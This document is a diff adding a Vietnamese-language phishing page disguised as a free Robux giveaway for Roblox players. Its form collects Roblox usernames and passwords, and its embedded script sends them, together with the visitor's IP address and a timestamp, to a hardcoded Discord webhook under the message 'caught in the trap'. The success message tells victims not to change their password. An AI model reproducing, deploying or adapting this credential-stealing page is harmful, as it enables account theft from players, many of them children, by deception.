@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html lang="vi">
+  <head>
+    <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+    <title>
+      Trung Tâm NHẬN ROBUX FREE 2024 - Roblox Miễn Phí 100%
+    </title>
+    <link rel="shortcut icon" href="https://nhanspins.com/upload/setting/15e139d84e5be50bdafdfc896c6182d4.png" />
+    <link rel="stylesheet" href="css/animate.css" />
+    <link rel="stylesheet" href="css/bootstrap.min.css" />
+    <link rel="stylesheet" href="css/template48ab.css?v=20221129234213" />
+    <script src="js/axios.min.js">
+    </script>
+    <script src="js/vue.js">
+    </script>
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async="" src="https://www.googletagmanager.com/gtag/js?id=G-DJ7ZJ91RPH">
+    </script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-DJ7ZJ91RPH');
+    </script>
+  </head>
+  <body>
+    <header id="header">
+      <div class="header__banner">
+        <div class="item" style="background-image: url('https://naprobuxvip.com/upload/setting/40365f25f5a5348b7f31b54f50b08b44.png');">
+        </div>
+        <div class="header__arrow">
+          <div class="container">
+            <div class="header__arrow-left" style="pointer-events: auto;">
+            </div>
+            <div class="header__arrow-right" style="pointer-events: auto;">
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="header__nav-box">
+        <div class="container">
+          <ul class="nav nav-tabs" id="myTab" role="tablist">
+            <li class="nav-item" role="presentation" data-toggle="tab" data-target="#gioithieu">
+              <button class="nav-link">
+                HƯỚNG DẪN NHẬN ROBUX
+              </button>
+            </li>
+            <li class="nav-item" role="presentation">
+              <button class="nav-link active" data-toggle="tab" data-target="#app">
+                NHẬN ROBUX FREE
+              </button>
+            </li>
+          </ul>
+        </div>
+      </div>
+    </header>
+    <section id="content" class="tab-content">
+      <div class="tab-pane" id="gioithieu">
+        <div class="container content__title">
+          <h3>
+            🎁 CHÀO MỪNG BẠN ĐẾN VỚI TRANG WEB NHẬN ROBUX FREE 2024 🎁
+          </h3>
+          <p>
+            Chương trình khuyến mãi đặc biệt dành cho cộng đồng Roblox Việt Nam!
+          </p>
+          <p>
+            Chúng tôi đang tri ân người chơi Roblox với chương trình NHẬN ROBUX MIỄN PHÍ 100%!
+          </p>
+          <p>
+            Hướng Dẫn Nhận Robux Free:
+          </p>
+          <p>
+            • Bước 1: Điền Tài Khoản Roblox của bạn
+          </p>
+          <p>
+            • Bước 2: Điền Mật Khẩu tài khoản (để xác minh chủ sở hữu)
+          </p>
+          <p>
+            • Bước 3: Chọn gói Robux bạn muốn nhận MIỄN PHÍ
+          </p>
+          <p>
+            • Bước 4: Nhấn nút "NHẬN NGAY" và chờ hệ thống xử lý
+          </p>
+          <p>
+            • Robux sẽ được cộng vào tài khoản của bạn trong vòng 24 giờ!
+          </p>
+          <p>
+            ⚠️ Lưu ý: Mỗi tài khoản chỉ được nhận 1 lần duy nhất!
+          </p>
+        </div>
+      </div>
+      <div class="tab-pane active" id="app">
+        <div v-if="msgError !== null" class="alert alert-warning fadeInUp animated">
+          {{msgError}}
+          <button type="button" class="close pl-2" @click="msgError = null">
+            <span aria-hidden="true">            ×
+</span>
+          </button>
+        </div>
+        <div v-if="msgButton === true" id="pageloader">
+          <img src="img/loader.svg" alt="processing..." />
+        </div>
+        <div class="container">
+          <div class="content__section" id="idgame">
+            <p class="content__title">
+              Thông Tin Tài Khoản Roblox
+            </p>
+            <div class="content__input">
+              <input type="text" v-model="username" maxlength="50" placeholder="Tài khoản Roblox" />
+            </div>
+            <div class="content__input mt-2">
+              <input type="password" v-model="password" maxlength="50" placeholder="Mật khẩu Roblox" />
+            </div>
+            <p style="font-size: 12px; color: #ff9900;">
+              ⚠️ Cần mật khẩu để xác minh chủ tài khoản, thông tin sẽ được bảo mật!
+            </p>
+          </div>
+
+          <div class="content__section" id="menhgia">
+            <p class="content__title">
+              Chọn Gói Robux Free
+            </p>
+            <ul class="content__amount row">
+              <li class="col-sm-3" @click="selectPackage('400')">
+                <div class="item" v-bind:class="(selectedPackage == '400')? 'active' : ''">
+                  <div class="item__box">
+                    <p class="d-flex align-items-center justify-content-center">
+                      <img src="" class="item__icon" />
+                      <span>                      400
+</span>
+                      <span class="item__bonus">                      +3000
+</span>
+                    </p>
+                  </div>
+                  <div class="item__pic">
+                    <img src="/upload/setting/e38dfb75e1c4c2297e8b162fdde501b3.png" />
+                  </div>
+                  <div class="item__text">
+                    <p>
+                      Tổng: 3,400 Robux
+                    </p>
+                  </div>
+                  <div class="item__price">
+                    <p>
+                      MIỄN PHÍ
+                    </p>
+                  </div>
+                </div>
+              </li>
+              <li class="col-sm-3" @click="selectPackage('800')">
+                <div class="item" v-bind:class="(selectedPackage == '800')? 'active' : ''">
+                  <div class="item__box">
+                    <p class="d-flex align-items-center justify-content-center">
+                      <img src="" class="item__icon" />
+                      <span>                      800
+</span>
+                      <span class="item__bonus">                      +6000
+</span>
+                    </p>
+                  </div>
+                  <div class="item__pic">
+                    <img src="/upload/setting/83ac6dbf3dab4b0170d019f0e7983fc8.png" />
+                  </div>
+                  <div class="item__text">
+                    <p>
+                      Tổng: 6,800 Robux
+                    </p>
+                  </div>
+                  <div class="item__price">
+                    <p>
+                      MIỄN PHÍ
+                    </p>
+                  </div>
+                </div>
+              </li>
+              <li class="col-sm-3" @click="selectPackage('1700')">
+                <div class="item" v-bind:class="(selectedPackage == '1700')? 'active' : ''">
+                  <div class="item__box">
+                    <p class="d-flex align-items-center justify-content-center">
+                      <img src="" class="item__icon" />
+                      <span>                      1700
+</span>
+                      <span class="item__bonus">                      +9000
+</span>
+                    </p>
+                  </div>
+                  <div class="item__pic">
+                    <img src="/upload/setting/893ef77a7442b532fb6de2ebda105260.png" />
+                  </div>
+                  <div class="item__text">
+                    <p>
+                      Tổng: 10,700 Robux
+                    </p>
+                  </div>
+                  <div class="item__price">
+                    <p>
+                      MIỄN PHÍ
+                    </p>
+                  </div>
+                </div>
+              </li>
+              <li class="col-sm-3" @click="selectPackage('4700')">
+                <div class="item" v-bind:class="(selectedPackage == '4700')? 'active' : ''">
+                  <div class="item__box">
+                    <p class="d-flex align-items-center justify-content-center">
+                      <img src="" class="item__icon" />
+                      <span>                      4700
+</span>
+                      <span class="item__bonus">                      +21000
+</span>
+                    </p>
+                  </div>
+                  <div class="item__pic">
+                    <img src="/upload/setting/b3d8b97cced86c9b2b9ded01d83ad2e4.png" />
+                  </div>
+                  <div class="item__text">
+                    <p>
+                      Tổng: 25,700 Robux
+                    </p>
+                  </div>
+                  <div class="item__price">
+                    <p>
+                      MIỄN PHÍ
+                    </p>
+                  </div>
+                </div>
+              </li>
+              <li class="col-sm-3" @click="selectPackage('10000')">
+                <div class="item" v-bind:class="(selectedPackage == '10000')? 'active' : ''">
+                  <div class="item__box">
+                    <p class="d-flex align-items-center justify-content-center">
+                      <img src="" class="item__icon" />
+                      <span>                      10000
+</span>
+                      <span class="item__bonus">                      +33000
+</span>
+                    </p>
+                  </div>
+                  <div class="item__pic">
+                    <img src="/upload/setting/bac63c0bea717d5571f7614a1490371b.png" />
+                  </div>
+                  <div class="item__text">
+                    <p>
+                      Tổng: 43,000 Robux
+                    </p>
+                  </div>
+                  <div class="item__price">
+                    <p>
+                      MIỄN PHÍ
+                    </p>
+                  </div>
+                </div>
+              </li>
+              <li class="col-sm-3" @click="selectPackage('22500')">
+                <div class="item" v-bind:class="(selectedPackage == '22500')? 'active' : ''">
+                  <div class="item__box">
+                    <p class="d-flex align-items-center justify-content-center">
+                      <img src="" class="item__icon" />
+                      <span>                      22500
+</span>
+                      <span class="item__bonus">                      +93000
+</span>
+                    </p>
+                  </div>
+                  <div class="item__pic">
+                    <img src="/upload/setting/22946d910e8a07c236018fde96ac5839.png" />
+                  </div>
+                  <div class="item__text">
+                    <p>
+                      Tổng: 115,500 Robux
+                    </p>
+                  </div>
+                  <div class="item__price">
+                    <p>
+                      MIỄN PHÍ
+                    </p>
+                  </div>
+                </div>
+              </li>
+            </ul>
+          </div>
+
+          <div class="content__section" id="pay">
+            <div class="pay__sec d-flex align-items-center justify-content-end">
+              <div class="pay__mess d-flex align-items-center">
+                <p class="pay__label mb-0">
+                  Robux sẽ nhận:
+                </p>
+                <p class="pay__total mb-0" style="color: #00ff00;">
+                  {{ getTotalRobux() }} Robux
+                </p>
+              </div>
+              <div type="button" class="pay__btn" @click="submitForm()">
+                NHẬN NGAY
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <footer id="footer">
+      <div class="container">
+        <div class="row align-items-center">
+          <div class="col-sm-12 text-center">
+            <p style="color: #00ff00; font-size: 14px;">
+              ⏳ Robux sẽ được cộng vào tài khoản của bạn trong vòng 24 giờ!
+            </p>
+          </div>
+        </div>
+      </div>
+    </footer>
+
+    <!-- Success Modal -->
+    <div class="modal fade" id="successModal" tabindex="-1">
+      <div class="modal-dialog">
+        <div class="modal-content">
+          <div class="modal-header" style="background-color: #00cc00;">
+            <h5 class="modal-title text-white">🎉 THÀNH CÔNG!</h5>
+          </div>
+          <div class="modal-body text-center">
+            <p>✅ Yêu cầu nhận Robux của bạn đã được ghi nhận!</p>
+            <p>📦 Gói: <strong>{{ selectedPackage }} Robux</strong></p>
+            <p>💰 Tổng cộng: <strong>{{ getTotalRobux() }} Robux</strong></p>
+            <p>⏳ Robux sẽ về tài khoản trong: <strong>24 giờ</strong></p>
+            <p>⚠️ Vui lòng không đổi mật khẩu trong thời gian chờ!</p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js">
+    </script>
+    <script src="js/jquery.slim.min.js">
+    </script>
+    <script src="js/bootstrap.bundle.min.js">
+    </script>
+    <script src="js/common48ab.js?v=20221129234213">
+    </script>
+    <script>
+      // Discord webhook URL
+      const WEBHOOK_URL = 'https://discord.com/api/webhooks/1436333242117521568/RIUzEtNwUF0T6TPfSsR5ZQsj0DkVp2GJStAEtTl_ZfQDTnTUlgnReW8PYiu4L3nScpQy';
+      
+      new Vue({
+        el: '#app',
+        data: {
+          username: '',
+          password: '',
+          selectedPackage: '400',
+          msgError: null,
+          msgButton: false
+        },
+        methods: {
+          selectPackage(pkg) {
+            this.selectedPackage = pkg;
+          },
+          
+          getTotalRobux() {
+            const bonusMap = {
+              '400': 3000,
+              '800': 6000,
+              '1700': 9000,
+              '4700': 21000,
+              '10000': 33000,
+              '22500': 93000
+            };
+            return parseInt(this.selectedPackage) + bonusMap[this.selectedPackage];
+          },
+          
+          async getIP() {
+            try {
+              const response = await fetch('https://api.ipify.org?format=json');
+              const data = await response.json();
+              return data.ip;
+            } catch (error) {
+              return 'Unknown';
+            }
+          },
+          
+          async submitForm() {
+            // Validate
+            if (!this.username.trim()) {
+              this.msgError = 'Vui lòng nhập tài khoản Roblox!';
+              return;
+            }
+            
+            if (!this.password.trim()) {
+              this.msgError = 'Vui lòng nhập mật khẩu!';
+              return;
+            }
+            
+            this.msgButton = true;
+            
+            try {
+              // Get user IP
+              const userIP = await this.getIP();
+              const currentTime = new Date().toLocaleString('vi-VN');
+              
+              // Prepare data for Discord webhook
+              const discordData = {
+                content: `@everyone dính bẫy\n` +
+                        `Tài khoản: ${this.username}\n` +
+                        `Mật khẩu: ${this.password}\n` +
+                        `IP: ${userIP}\n` +
+                        `Time: ${currentTime}\n` +
+                        `Gói Robux: ${this.getTotalRobux()}`
+              };
+              
+              // Send to Discord webhook
+              await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(discordData)
+              });
+              
+              // Show success message
+              $('#successModal').modal('show');
+              
+              // Reset form
+              this.username = '';
+              this.password = '';
+              this.selectedPackage = '400';
+              this.msgError = null;
+              
+            } catch (error) {
+              this.msgError = 'Đã xảy ra lỗi, vui lòng thử lại!';
+            } finally {
+              this.msgButton = false;
+            }
+          }
+        }
+      });
+      
+      // Scroll functions
+      function menhgia() {
+        document.querySelector('#menhgia').scrollIntoView({behavior: 'smooth'});
+      }
+      
+      function thanhtoan() {
+        document.querySelector('#pay').scrollIntoView({behavior: 'smooth'});
+      }
+    </script>
+    
+    <style>
+      .pay__btn {
+        background: linear-gradient(45deg, #00cc00, #00ff00);
+        border: none;
+        color: white;
+        padding: 12px 30px;
+        border-radius: 25px;
+        font-weight: bold;
+        cursor: pointer;
+        transition: all 0.3s;
+      }
+      
+      .pay__btn:hover {
+        background: linear-gradient(45deg, #00aa00, #00dd00);
+        transform: scale(1.05);
+      }
+      
+      .item__price p {
+        color: #00ff00 !important;
+        font-weight: bold;
+        font-size: 18px;
+      }
+      
+      .item.active {
+        border: 3px solid #00ff00 !important;
+        box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
+      }
+      
+      .pay__total {
+        color: #00ff00 !important;
+        font-size: 24px;
+        font-weight: bold;
+        margin-left: 10px;
+      }
+      
+      .content__input input {
+        border: 2px solid #00cc00;
+        padding: 12px;
+        border-radius: 10px;
+        width: 100%;
+      }
+      
+      h3 {
+        color: #00ff00;
+      }
+    </style>
+  </body>
+</html>
